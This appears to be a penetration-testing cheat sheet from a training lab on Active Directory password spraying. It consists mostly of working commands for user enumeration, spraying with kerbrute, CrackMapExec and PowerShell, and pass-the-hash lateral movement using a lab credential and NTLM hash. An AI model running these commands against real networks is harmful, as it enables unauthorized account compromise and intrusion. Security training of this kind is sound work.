# Password Spraying
**Concept:** "Low and Slow." We test a single, common password (e.g., `Welcome1!` or `Company2023!`) against a list of valid usernames to find a weak link. 
**Prerequisite:** A list of valid usernames. Spraying "blind" is inefficient and noisy.
## 1. Building the User List (Enumeration)
**Goal:** Identify valid accounts to target.
### Method A: SMB NULL Session
**Context:** If the target allows anonymous SMB access, we can pull the user list directly.
```shell
# Enum4Linux
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

# Rpcclient (Connect anonymously)
rpcclient -U "" -N 172.16.5.5
# Inside rpcclient prompt:
# > enumdomusers
```
### Method B: LDAP (Anonymous / Low Priv)
**Context:** Querying the Domain Controller via LDAP.
```shell
# Windapsearch (Python tool)
# -U: Enumerate Users
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

# CrackMapExec (If you have a low-priv credential already)
crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
### Method C: Kerbrute (User Enum)
**Context:** Brute-forcing usernames against Kerberos (Port 88). This is **stealthier** than SMB because it doesn't generate Windows Logon Failure events (Event ID 4625) in the same way, though it generates Kerberos errors.
```shell
# Validate a list of names (jsmith.txt) against the DC
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
## 2. Internal Spraying (From Linux)
**Goal:** You are on your attacker machine (Kali), targeting the domain.
### Kerbrute (The Gold Standard)
**Why:** It's fast and verifies credentials against the KDC directly.
```shell
# Syntax: kerbrute passwordspray -d <Domain> --dc <IP> <UserList> <Password>
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt "Welcome1"
```
### CrackMapExec / NetExec
**Why:** It can verify access to specific services (SMB, WinRM) immediately.
```shell
# Spray "Password123" against a list of users
# grep + filters for successful logins
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Password123' | grep +
```
### Bash One-Liner (Living off the Land)
**Why:** If you don't have tools installed, use a loop with `rpcclient`.
```shell
for u in $(cat valid_users.txt); do 
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```
## 3. Internal Spraying (From Windows)
**Context:** You have compromised a Windows host and want to spray the domain from _inside_. 
**Tool:** `DomainPasswordSpray.ps1` (PowerShell).

```powershell
# Import the module
Import-Module .\DomainPasswordSpray.ps1

# Spray one password
Invoke-DomainPasswordSpray -Password "Welcome1" -OutFile spray_results.txt -ErrorAction SilentlyContinue
```
## 4. Local Administrator Reuse (Lateral Movement)
**Context:** You compromised a machine and dumped the local Administrator hash. You want to see if this same Administrator password works on _other_ machines in the subnet (a common misconfiguration).

**Tool:** CrackMapExec with `--local-auth`.
```shell
# Target the whole subnet (172.16.5.0/23)
# -u: Administrator (Local)
# -H: The NTLM hash
# --local-auth: Force local authentication (don't use Domain)
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```
- **Result:** Any machine that responds with `(+)` (Pwn3d!) can be accessed immediately using that hash (Pass-the-Hash).